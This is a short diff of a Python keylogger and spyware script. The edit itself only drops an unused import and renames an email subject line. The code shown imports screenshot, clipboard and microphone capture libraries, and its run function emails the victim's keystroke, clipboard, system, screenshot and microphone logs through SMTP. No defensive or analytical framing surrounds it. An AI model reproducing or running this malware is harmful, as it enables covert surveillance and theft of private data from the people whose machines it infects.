@@ -8,7 +8,7 @@ from multiprocessing import process, freeze_support
 from PIL import ImageGrab
 from requests import get
 from scipy.io.wavfile import write
-import smtplib, socket, platform, win32clipboard, os, time, getpass, sounddevice as sd, tempfile, re
+import smtplib, socket, platform, win32clipboard, os, time, getpass, sounddevice as sd, tempfile
 
 fileName = getpass.getuser()+".log"
 sysName = getpass.getuser()+"_sys.txt"
@@ -139,7 +139,7 @@ def run():
     fetchSs()
     fetchRcd()
     sendMail(subject=getpass.getuser()+" key logs", fileName=fileName, attachment=filePath)
-    sendMail(subject=getpass.getuser()+" clip logs", fileName=clipName, attachment=clipPath)
+    sendMail(subject=getpass.getuser()+" clipboard logs", fileName=clipName, attachment=clipPath)
     sendMail(subject=getpass.getuser()+" sys logs", fileName=sysName, attachment=sysPath)
     sendMail(subject=getpass.getuser()+" screenshot logs", fileName=ssName, attachment=ssPath)
     sendMail(subject=getpass.getuser()+" mic logs", fileName=rcdName, attachment=rcdPath)
